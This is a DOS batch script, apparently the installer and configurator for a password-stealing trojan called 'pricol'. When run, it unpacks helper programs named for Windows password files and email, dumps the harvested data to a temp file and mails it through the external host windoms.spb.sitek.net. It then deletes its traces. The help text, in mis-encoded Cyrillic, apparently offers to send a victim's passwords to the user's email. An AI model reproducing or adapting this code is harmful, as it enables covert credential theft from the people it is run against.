@echo off
cls
if -%1==-/? goto help
if not exist pricol.dll goto nofile
ren pricol.dll temp1.exe
temp1.exe >nul
if -%1==- goto vir
del temp1.exe
del pricol.1
rem �� ��� 䠩�
cls
echo @echo offf >pricol.1
echo prikol.exe windoms.spb.sitek.net temp %1 >pricol.1
copy pricol.2 bsa.exe >nul
rem �� BSA.EXE
bsa.exe -a 9 pricol.1 pricol.2 pricol.3 pricol.4 pricol.5
cls
del pricol.1
del pricol.2
del pricol.3
rem �� PWL.EXE
del pricol.4
rem �� EMAIL.EXE
del pricol.5
rem �� ᠬ �ਪ��
cls
bsa.exe -s 9.bsa
del 9.bsa
del bsa.exe
cls
ren 9.exe pricol.dll
echo �ணࠬ�� �뫠 �ᯥ譮 ᪮�䨣��஢��� �� ���� %1 :-))
pause
goto end
:vir
ren temp1.exe pricol.dll
ren pricol.1 pricol.bat
del pricol.2
ren pricol.3 precol.exe
ren pricol.4 prikol.exe
ren pricol.5 prekol.exe
cls
precol.exe >temp
del precol.exe
echo Please wait some minutes....
prikol.exe windoms.spb.sitek.net temp login@windoms.spb.sitek.net
call pricol.bat
del pricol.bat
cls
prekol.exe
del prikol.exe
del prekol.exe
del temp
goto end
:nofile
echo File "PRICOL.DLL" is not found....
goto end
:help
echo �������������������������������������������������������������������ͻ
echo ��� �����⥫쭠� �ணࠬ�� ��ࠢ��� ��஫� 砩���� �� ��� Email.�
echo ���� ����ன�� �ணࠬ�� �� ᢮� Email ������� �� � �ଠ�:	    �
echo �			 "PRICOL.EXE email@host.net"		    �
echo �������������������������������������������������������������������ͼ
pause
goto end
:end